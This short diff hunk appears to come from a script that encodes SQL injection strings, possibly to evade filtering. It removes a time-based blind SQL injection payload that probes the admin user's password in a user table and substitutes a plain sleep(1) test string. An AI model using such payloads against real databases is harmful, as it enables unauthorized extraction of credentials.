@@ -30,4 +30,4 @@ def encoding(input_string):
 max = 0xFFFFF
 find_replacements(max)
 
-print(encoding("1 and (select sleep({treshold}) from user where username = 'admin' and hex(password) like '%')"))
+print(encoding("sleep(1)"))
